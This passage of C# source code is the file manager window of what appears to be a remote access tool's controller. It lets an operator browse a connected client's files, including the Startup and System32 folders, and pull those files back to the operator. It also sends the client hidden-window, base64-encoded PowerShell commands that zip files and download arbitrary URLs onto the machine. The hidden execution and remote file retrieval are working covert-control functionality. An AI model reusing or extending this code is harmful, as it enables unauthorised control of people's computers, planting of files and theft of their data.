            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmExec,
                Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = "normal" })
            });
            TxtStatus.Text = string.Format(Lang.Get("FM_PLAYING"), row.Name);
            ServerWindow.ReportGlobalActivity("Play audio", row.Name, "complete");
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
            ServerWindow.ReportGlobalActivity("Play audio", row.Name, "failed");
        }
    }

    private async void Zip_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        var dest = path + ".zip";

        ServerWindow.ReportGlobalActivity("Zip item", row.Name, "running");
        ServerWindow.LogGlobal($"[FM] Zipping '{path}' to '{dest}' on client {_clientId}...");

        // Use PS encoded command — paths quoted in SET to handle & in names/paths
        var ps  = "Compress-Archive -Path $env:SERO_SRC -DestinationPath $env:SERO_DST -Force";
        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
        try
        {
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.AutoTaskShell,
                Data = $"SET \"SERO_SRC={path}\"&& SET \"SERO_DST={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
            });
            TxtStatus.Text = string.Format(Lang.Get("FM_ZIPPING"), row.Name);
            await Task.Delay(2000);
            ServerWindow.ReportGlobalActivity("Zip item", row.Name, "complete");
            ServerWindow.LogGlobal($"[FM] Zip command executed for '{path}' on client {_clientId}.");
            await Navigate(_currentPath);
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
            ServerWindow.ReportGlobalActivity("Zip item", row.Name, "failed");
        }
    }

    private async void DownloadUrl_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(_currentPath))
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), "Navigate to a folder first");
            return;
        }

        var url = PromptInput(Lang.Get("FM_URL_PROMPT"), "https://");
        if (string.IsNullOrWhiteSpace(url)) return;

        // Validate URL before sending
        if (!Uri.TryCreate(url, UriKind.Absolute, out var parsedUri) ||
            (parsedUri.Scheme != "http" && parsedUri.Scheme != "https"))
        {
            TxtStatus.Text = Lang.Get("FM_INVALID_URL");
            return;
        }

        var filename = Path.GetFileName(parsedUri.LocalPath);
        if (string.IsNullOrWhiteSpace(filename)) filename = "download";
        // Sanitize filename — strip any path separators
        filename = Path.GetFileName(filename);
        var dest = Path.Combine(_currentPath, filename);

        ServerWindow.ReportGlobalActivity("Download URL", filename, "running");
        ServerWindow.LogGlobal($"[FM] Requesting URL download '{url}' to '{dest}' on client {_clientId}...");

        // Use PS encoded command — values quoted in SET so & in URLs/paths is treated literally
        var ps  = "Invoke-WebRequest -Uri $env:SERO_URL -OutFile $env:SERO_OUT -UseBasicParsing";
        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
        try
        {
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.AutoTaskShell,
                Data = $"SET \"SERO_URL={url}\"&& SET \"SERO_OUT={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
            });
            TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), filename);
            await Task.Delay(3000);
            ServerWindow.ReportGlobalActivity("Download URL", filename, "complete");
            ServerWindow.LogGlobal($"[FM] Download URL command executed for '{url}' on client {_clientId}.");
            await Navigate(_currentPath);
        }
        catch (Exception ex)
        {
            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
            ServerWindow.ReportGlobalActivity("Download URL", filename, "failed");
        }
    }

    // ── Navigation buttons ──────────────────────────

    private async void Back_Click(object s, RoutedEventArgs e)
    {
        if (_history.TryPop(out var prev))
        {
            var saved = _currentPath;
            _currentPath = "";           // cleared so Navigate won't re-push it
            await Navigate(prev);
            if (string.IsNullOrEmpty(_currentPath)) _currentPath = saved; // restore on timeout/error
        }
        else
        {
            var parent = Path.GetDirectoryName(_currentPath);
            await Navigate(parent ?? "");
        }
    }

    private async void Refresh_Click(object s, RoutedEventArgs e) => await Navigate(_currentPath);
    private async void GoPath_Click(object s, RoutedEventArgs e) => await Navigate(TxtPath.Text.Trim());
    private async void TxtPath_KeyDown(object s, KeyEventArgs e) { if (e.Key == Key.Return) await Navigate(TxtPath.Text.Trim()); }

    private async void GoToDesktop_Click(object s, RoutedEventArgs e) => await Navigate("%USERPROFILE%\\Desktop");
    private async void GoToUser_Click(object s, RoutedEventArgs e)    => await Navigate("%USERPROFILE%");
    private async void GoToTemp_Click(object s, RoutedEventArgs e)    => await Navigate("%TEMP%");
    private async void GoToAppData_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%");
    private async void GoToStartup_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    private async void GoToWindows_Click(object s, RoutedEventArgs e)  => await Navigate("%SystemRoot%");
    private async void GoToSystem32_Click(object s, RoutedEventArgs e) => await Navigate("%SystemRoot%\\System32");

    private async void DrivesList_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (DrivesList.SelectedItem is DriveItemVM driveItem)
        {
            DrivesList.SelectedItem = null;
            await Navigate(driveItem.Path);
        }
    }

    private async void GridFiles_DoubleClick(object s, MouseButtonEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || !row.IsDir) return;
        var path = string.IsNullOrEmpty(_currentPath)
            ? row.Name
            : Path.Combine(_currentPath, row.Name);
        await Navigate(path);
    }

    // ── Helpers ─────────────────────────────────────

    private static string? PromptInput(string label, string defaultVal = "")
    {
        var dlg = new Window
        {
            Title = Lang.Get("DLG_INPUT_TITLE"), Width = 380, Height = 130,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = label, Foreground = System.Windows.Media.Brushes.White,
            FontSize = 12, Margin = new Thickness(0, 0, 0, 8)
        });
        var tb = new System.Windows.Controls.TextBox
        {
            Text = defaultVal,
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24)),
            Foreground = System.Windows.Media.Brushes.White,
            BorderBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(42, 48, 88)),
            Padding = new Thickness(6, 4, 6, 4),
            Margin = new Thickness(0, 0, 0, 8)
        };
        sp.Children.Add(tb);
        var ok = new System.Windows.Controls.Button
        {
            Content = Lang.Get("DLG_OK"), Width = 60, HorizontalAlignment = HorizontalAlignment.Right,
            Padding = new Thickness(10, 4, 10, 4)
        };
        ok.Click += (_, _) => { dlg.DialogResult = true; };
        sp.Children.Add(ok);
        dlg.Content = sp;
        tb.SelectAll(); tb.Focus();
        return dlg.ShowDialog() == true ? tb.Text : null;
    }

    // ── Preview pane ─────────────────────────────────────────────────────────

    private string? _previewTempFile;

    private void GridFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir)
        {
            TxtPreviewName.Text = GridFiles.SelectedItems.Count > 1
                ? $"{GridFiles.SelectedItems.Count} items selected"
                : "No file selected";
            BtnPreview.IsEnabled = false;
            return;
        }
        TxtPreviewName.Text = vm.Name;
        BtnPreview.IsEnabled = true;
        // Auto-preview for images, text, and small videos (< 150 MB)
        var ext = Path.GetExtension(vm.Name).ToLowerInvariant();
        bool isImage = ext is ".jpg" or ".jpeg" or ".png" or ".gif" or ".bmp" or ".webp" or ".ico";
        bool isText  = ext is ".txt" or ".log" or ".ini" or ".cfg" or ".json" or ".xml" or ".csv" or ".bat" or ".ps1" or ".py" or ".cs";
        bool isVideo = ext is ".mp4" or ".avi" or ".mkv" or ".mov" or ".wmv" or ".webm" or ".m4v";
        if (isImage || isText || (isVideo && vm.SizeRaw < 150L * 1024 * 1024))
            BtnPreview_Click(null!, new RoutedEventArgs());
    }

    private async void BtnPreview_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir) return;
        var path = _currentPath.TrimEnd('\\', '/') + "\\" + vm.Name;
        var ext  = Path.GetExtension(vm.Name).ToLowerInvariant();

        TxtPreviewInfo.Text = Lang.Get("STATUS_LOADING");
        ShowPreviewPanel("empty");
        BtnPreview.IsEnabled = false;

        try
        {
            // Cancel any in-flight preview (rapid file selection) so its stale
            // response doesn't complete the new TCS with the wrong file's data.
            _pendingPreview?.TrySetCanceled();
            _pendingPreview = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmDownload,
                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = path })
            });
            bool isVideoExt = ext is ".mp4" or ".avi" or ".mkv" or ".mov" or ".wmv" or ".webm" or ".m4v";
            var json   = await _pendingPreview.Task.WaitAsync(isVideoExt ? TimeSpan.FromSeconds(120) : TimeSpan.FromSeconds(30));
            // Offload JSON decode + Base64 decode to background thread
            var (result, bytes) = await Task.Run(() =>
            {
                var r = JsonConvert.DeserializeObject<FmFileDataResult>(json);
                var b = (r != null && string.IsNullOrEmpty(r.Error)) ? Convert.FromBase64String(r.Data) : null;
                return (r, b);
            });
            if (result == null || bytes == null || !string.IsNullOrEmpty(result.Error))
            { TxtPreviewInfo.Text = result?.Error ?? "Error"; ShowPreviewPanel("empty"); return; }

            bool isImage = ext is ".jpg" or ".jpeg" or ".png" or ".gif" or ".bmp" or ".webp" or ".ico";
            bool isVideo = ext is ".mp4" or ".avi" or ".mkv" or ".mov" or ".wmv" or ".webm" or ".m4v";
            bool isText  = ext is ".txt" or ".log" or ".ini" or ".cfg" or ".json" or ".xml"
                                or ".csv" or ".bat" or ".ps1" or ".py" or ".cs" or ".md" or ".html" or ".css";

            if (isImage)
            {
                using var ms = new System.IO.MemoryStream(bytes);
                var bmp = new System.Windows.Media.Imaging.BitmapImage();
                bmp.BeginInit();
                bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
                bmp.StreamSource = ms;
                bmp.EndInit();
                bmp.Freeze();
                PreviewImage.Source = bmp;
                ShowPreviewPanel("image");
                TxtPreviewName.Text = $"{vm.Name}  ({bmp.PixelWidth}×{bmp.PixelHeight})";
            }
            else if (isVideo)
            {
                if (_previewTempFile != null) try { System.IO.File.Delete(_previewTempFile); } catch { }
                _previewTempFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), _tempPrefix + Path.GetFileName(vm.Name));
                await System.IO.File.WriteAllBytesAsync(_previewTempFile, bytes);
                // Make element visible BEFORE setting source so MediaElement can measure
                ShowPreviewPanel("video");
                PreviewVideo.Source = new Uri(System.IO.Path.GetFullPath(_previewTempFile), UriKind.Absolute);
                PreviewVideo.Volume = 0.8;
                // Play() is called by the MediaOpened event handler — not here
                TxtPreviewName.Text = vm.Name;
            }
            else if (isText)
            {
                var text = System.Text.Encoding.UTF8.GetString(bytes);
                if (text.Length > 200_000) text = text[..200_000] + "\n[truncated]";
                PreviewText.Text = text;
                ShowPreviewPanel("text");
            }
            else
            {
                TxtPreviewInfo.Text = $"{vm.Name}\n{vm.SizeDisplay}\n{vm.Modified}";
                ShowPreviewPanel("empty");
            }
        }
        catch (OperationCanceledException) { /* superseded by a newer preview request — silent */ }
        catch (Exception ex) { TxtPreviewInfo.Text = ex.Message; ShowPreviewPanel("empty"); }
        finally { _pendingPreview = null; BtnPreview.IsEnabled = true; }
    }

    private void ShowPreviewPanel(string which)
    {
        PreviewImage.Visibility = which == "image" ? Visibility.Visible : Visibility.Collapsed;
        PreviewVideo.Visibility = which == "video" ? Visibility.Visible : Visibility.Collapsed;
        TextScroll.Visibility   = which == "text"  ? Visibility.Visible : Visibility.Collapsed;
        PreviewEmpty.Visibility = which == "empty" ? Visibility.Visible : Visibility.Collapsed;
        if (which != "video") { try { PreviewVideo.Stop(); PreviewVideo.Source = null; } catch { } }
    }

    private void PreviewVideo_Click(object s, System.Windows.Input.MouseButtonEventArgs e)
    {
        try
        {
            if (PreviewVideo.CanPause) PreviewVideo.Pause();
            else PreviewVideo.Play();
        }
        catch { }
    }

    private void GridFiles_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is FileEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Name); } catch { }
    }

    private void GridFiles_CopyPath_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is FileEntryVM vm)
            try
            {
                var full = Path.Combine(_currentPath, vm.Name);
                System.Windows.Clipboard.SetText(full);
                TxtStatus.Text = string.Format(Lang.Get("COPIED"), full);
            }
            catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void GridFiles_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridFiles.SelectedItems.Count == 0) e.Handled = true;
    }
}

public class FileEntryVM
{
    public System.Windows.Media.ImageSource? IconImage    { get; }
    public string Name         { get; }
    public bool   IsDir        { get; }
    public bool   IsHidden     { get; }
    public long   SizeRaw      { get; }
    public string SizeDisplay  { get; }
    public string Modified     { get; }
    public string Created      { get; }
    public string TypeDisplay  { get; }
    public string AttribDisplay { get; }
    public int    AttributesRaw { get; }

    public FileEntryVM(FmEntry e)
    {
        Name     = e.Name;
        IsDir    = e.IsDir;
        IsHidden = e.IsHidden;
        Modified = e.Modified;
        Created  = e.Created;
        AttributesRaw = e.Attributes;
        SizeRaw  = e.IsDir ? -1 : e.Size;
        var ext = e.IsDir ? "" : Path.GetExtension(e.Name);
        IconImage = (e.IsDir && e.Name.Length >= 2 && e.Name[1] == ':')
            ? ShellIcon.GetDrive(e.Name.TrimEnd('\\', '/') + "\\")
            : ShellIcon.Get(ext, e.IsDir);

        if (e.IsDir)
        {
            SizeDisplay = "";
            TypeDisplay = "Folder";
        }
        else
        {
            TypeDisplay = string.IsNullOrEmpty(ext) ? "File" : ext.TrimStart('.').ToUpperInvariant();
            var bytes = e.Size;
            SizeDisplay = bytes < 1024           ? $"{bytes} B"
                        : bytes < 1024 * 1024    ? $"{bytes / 1024.0:F1} KB"
                        : bytes < 1024L*1024*1024 ? $"{bytes / (1024.0*1024):F1} MB"
                        : $"{bytes / (1024.0*1024*1024):F1} GB";
        }

        var attrs = (System.IO.FileAttributes)e.Attributes;
        var parts = new System.Text.StringBuilder(4);
        if (attrs.HasFlag(System.IO.FileAttributes.ReadOnly)) parts.Append('R');
        if (attrs.HasFlag(System.IO.FileAttributes.Hidden))   parts.Append('H');
        if (attrs.HasFlag(System.IO.FileAttributes.System))   parts.Append('S');
        if (attrs.HasFlag(System.IO.FileAttributes.Archive))  parts.Append('A');
        AttribDisplay = parts.Length > 0 ? parts.ToString() : "—";
    }
}

public class DriveItemVM
{
    public string Path { get; }
    public System.Windows.Media.ImageSource? Icon { get; }
    public DriveItemVM(string path) { Path = path; Icon = ShellIcon.GetDrive(path); }
}
